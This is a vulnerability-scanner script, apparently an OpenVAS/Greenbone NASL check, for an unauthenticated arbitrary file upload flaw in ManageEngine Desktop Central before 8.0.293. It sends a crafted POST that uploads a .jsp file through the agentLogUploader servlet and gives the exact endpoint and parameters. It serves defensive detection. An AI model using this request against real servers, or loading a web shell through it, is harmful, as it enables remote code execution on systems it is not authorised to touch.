CPE = "cpe:/a:zohocorp:manageengine_desktop_central";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803777" );
	script_version( "2021-09-23T11:49:54+0000" );
	script_cve_id( "CVE-2013-7390", "CVE-2014-5007" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-09-23 11:49:54 +0000 (Thu, 23 Sep 2021)" );
	script_tag( name: "creation_date", value: "2013-11-20 12:28:14 +0530 (Wed, 20 Nov 2013)" );
	script_name( "ManageEngine Desktop Central < 8.0.293 Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_manage_engine_desktop_central_http_detect.sc" );
	script_mandatory_keys( "manageengine/desktop_central/http/detected" );
	script_require_ports( "Services/www", 8020 );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/29674" );
	script_xref( name: "URL", value: "http://security-assessment.com/files/documents/advisory/DesktopCentral%20Arbitrary%20File%20Upload.pdf" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to gain arbitrary
  code execution on the server." );
	script_tag( name: "affected", value: "ManageEngine Desktop Central prior to version 8.0.293." );
	script_tag( name: "insight", value: "The flaw in the AgentLogUploadServlet. This servlet takes input
  from HTTP POST and constructs an output file on the server without performing any sanitisation or
  even checking if the caller is authenticated." );
	script_tag( name: "solution", value: "Update to version 8.0.293 or later." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "summary", value: "ManageEngine Desktop Central is prone to an arbitrary file
  upload vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
postdata = "This file is uploaded by a " + vtstring + " for vulnerability testing";
file = vtstrings["lowercase_rand"] + ".jsp";
url = dir + "/agentLogUploader?computerName=DesktopCentral&domainName=webapps&customerId=1&filename=" + file;
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: text/html;\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "X-dc-header: yes" )){
	report = "It was possible to upload the file \"" + dir + "/" + file + "\". Please delete this file.";
	report += "\n" + http_report_vuln_url( url: url, port: port );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

